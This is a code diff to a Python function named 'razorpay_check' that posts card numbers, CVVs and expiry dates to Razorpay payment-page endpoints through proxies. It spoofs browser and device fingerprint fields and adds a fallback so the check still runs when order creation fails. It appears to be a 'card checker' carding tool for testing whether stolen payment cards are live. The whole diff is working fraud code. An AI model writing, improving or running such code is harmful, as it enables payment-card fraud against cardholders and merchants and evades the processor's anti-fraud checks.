@@ -250,36 +250,41 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
     try:
         async with aiohttp.ClientSession(connector=connector) as s:
 
-            # ── Step 1: Create order ────────────────────────────────────────
+            # ── Step 1: Create order (try with order endpoint, fallback to plink) ──
+            order_id       = ''
+            order_amount   = 100
+            order_currency = 'INR'
+
             _order_body = {'notes': {'comment': '', 'name': card_name}}
             if ppid:
                 _order_body['line_items'] = [{'payment_page_item_id': ppid, 'amount': 100}]
             else:
                 _order_body['amount'] = 100
-            async with s.post(
-                f'{RZ_API}/v1/payment_pages/{plink}/order',
-                json=_order_body,
-                headers={
-                    'Accept':        'application/json, text/plain, */*',
-                    'Content-Type':  'application/json',
-                    'Origin':        'https://razorpay.me',
-                    'Referer':       site + '/',
-                    'keyless_header': keyless,
-                },
-                proxy=proxy,
-                timeout=aiohttp.ClientTimeout(total=15)
-            ) as r:
-                order_data = await r.json(content_type=None)
+            try:
+                async with s.post(
+                    f'{RZ_API}/v1/payment_pages/{plink}/order',
+                    json=_order_body,
+                    headers={
+                        'Accept':         'application/json, text/plain, */*',
+                        'Content-Type':   'application/json',
+                        'Origin':         'https://razorpay.me',
+                        'Referer':        site + '/',
+                        'keyless_header': keyless,
+                    },
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=12)
+                ) as r:
+                    od = await r.json(content_type=None)
+                oo = od.get('order', {})
+                order_id       = oo.get('id', '')
+                order_amount   = max(oo.get('amount', 100), 100)
+                order_currency = oo.get('currency', 'INR') or 'INR'
+            except Exception:
+                pass
 
-            order_obj    = order_data.get('order', {})
-            order_id     = order_obj.get('id', '')
-            if not order_id:
-                desc = order_data.get('error', {}).get('description', 'Order creation failed')
-                return {'status': 'Error', 'message': desc, 'card': card}
-
-            order_amount   = max(order_obj.get('amount', 100), 100)
-            order_currency = order_obj.get('currency', 'INR')
-            checkout_id    = order_id.split('_', 1)[-1] if '_' in order_id else order_id
+            # If order creation failed, use plink directly as entity
+            entity_id   = order_id if order_id else plink
+            checkout_id = entity_id.split('_', 1)[-1] if '_' in entity_id else entity_id
 
             # ── Step 2: Get session token ────────────────────────────────────
             async with s.get(
@@ -328,7 +333,7 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
             try:
                 await s.post(
                     f'{RZ_API}/v2/standard_checkout/preferences',
-                    params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless},
+                    params={'x_entity_id': entity_id, 'session_token': sessid, 'keyless_header': keyless},
                     json={
                         'query': [{'resource': r} for r in _pref_resources],
                         'query_params': {
@@ -382,25 +387,30 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
                              'metadata': {'session_id': checkout_id}}]).encode()
             ).decode()
 
+            _pay_data = {
+                'user_risk_providers_token': token_b64,
+                'notes[comment]': '', 'notes[email]': email,
+                'notes[phone]': phone_short, 'notes[name]': card_name,
+                'payment_link_id': plink, 'key_id': key_id,
+                'contact': phone, 'email': email, 'currency': order_currency,
+                '_[integration]': 'payment_pages', '_[checkout_id]': checkout_id,
+                '_[device.id]': device_id, '_[env]': '',
+                '_[library]': 'checkoutjs', '_[library_src]': 'no-src',
+                '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
+                '_[platform]': 'browser', '_[referer]': site + '/',
+                '_[shield][fhash]': fhash, '_[shield][tz]': '-330',
+                '_[device_id]': device_id, '_[build]': BUILD,
+                '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
+                '_[shield][browser]': 'chrome', '_[request_index]': '1',
+                'amount': str(order_amount),
+            }
+            if order_id:
+                _pay_data['order_id'] = order_id
+
             async with s.post(
                 f'{RZ_API}/v1/standard_checkout/payments/create/ajax',
-                params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless},
-                data={
-                    'user_risk_providers_token': token_b64,
-                    'notes[comment]': '', 'notes[email]': email,
-                    'notes[phone]': phone_short, 'notes[name]': card_name,
-                    'payment_link_id': plink, 'key_id': key_id,
-                    'contact': phone, 'email': email, 'currency': order_currency,
-                    '_[integration]': 'payment_pages', '_[checkout_id]': checkout_id,
-                    '_[device.id]': device_id, '_[env]': '',
-                    '_[library]': 'checkoutjs', '_[library_src]': 'no-src',
-                    '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
-                    '_[platform]': 'browser', '_[referer]': site + '/',
-                    '_[shield][fhash]': fhash, '_[shield][tz]': '-330',
-                    '_[device_id]': device_id, '_[build]': BUILD,
-                    '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
-                    '_[shield][browser]': 'chrome', '_[request_index]': '1',
-                    'amount': str(order_amount), 'order_id': order_id,
+                params={'x_entity_id': entity_id, 'session_token': sessid, 'keyless_header': keyless},
+                data={**_pay_data,
                     'method': 'card', 'card[number]': cc, 'card[cvv]': cvv,
                     'card[name]': card_name, 'card[expiry_month]': mm.zfill(2),
                     'card[expiry_year]': yy, 'save': '0', 'dcc_currency': order_currency,
